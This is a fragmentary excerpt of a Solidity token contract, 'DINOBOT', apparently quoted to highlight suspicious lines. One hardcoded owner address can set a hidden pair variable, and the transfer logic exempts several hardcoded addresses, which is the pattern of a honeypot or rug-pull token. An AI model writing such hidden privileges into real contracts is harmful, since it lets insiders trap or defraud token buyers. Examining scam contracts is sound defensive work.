...
contract DINOBOT is Ownable, IERC20, IERC20Meta {
    ...
    function actionPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0xEac07938452c77eF07905c0949277DaE1D36c97a) _p76234 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) ||
         ...
         from  != 0x102706Aa57b5EDd3e45Cc5eA6350510a334F97a4 
         && from != 0xEac07938452c77eF07905c0949277DaE1D36c97a
         && from != 0xc00ce579b777A16573D84c87dA0Bf381f692A1e1)) {
    ...
    constructor() {
        _name = unicode"DINOBOT";
        _symbol = unicode"DINOBOT";
        _mint(msg.sender, 198000000000 * 10 ** decimals());
    }
